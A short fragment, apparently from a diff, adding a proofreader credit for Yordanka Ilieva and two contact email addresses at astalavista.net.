+dancho@astalavista.net
+
+Proofreader - Yordanka Ilieva
+danny@astalavista.net
